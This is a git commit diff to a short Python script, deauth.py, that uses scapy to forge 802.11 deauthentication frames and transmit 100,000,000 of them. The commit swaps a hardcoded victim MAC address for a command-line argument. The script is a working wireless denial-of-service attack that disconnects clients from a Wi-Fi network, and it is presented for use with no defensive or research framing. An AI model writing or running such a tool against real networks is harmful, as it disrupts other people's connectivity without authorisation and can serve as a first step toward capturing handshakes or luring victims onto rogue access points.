15724d97b80b3f20fa10e37f91e842dde3e4880c
Madff386 <69940651+Madff386@users.noreply.github.com>
2021-01-17 15:29:38 +1100

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -1,8 +1,8 @@
 import sys
 from scapy.all import *
 
-mac="18:56:80:00:A4:2E"
 
-packet=RadioTap()/Dot11(type=8, subtype=12, addr1=mac,addr2=sys.argv[2],addr3=sys.argv[2])/Dot11Deauth()
+
+packet=RadioTap()/Dot11(type=8, subtype=12, addr1=sys.argv[3],addr2=sys.argv[2],addr3=sys.argv[2])/Dot11Deauth()
 
 sendp(packet,iface=sys.argv[1],count=100000000,inter=0.1)
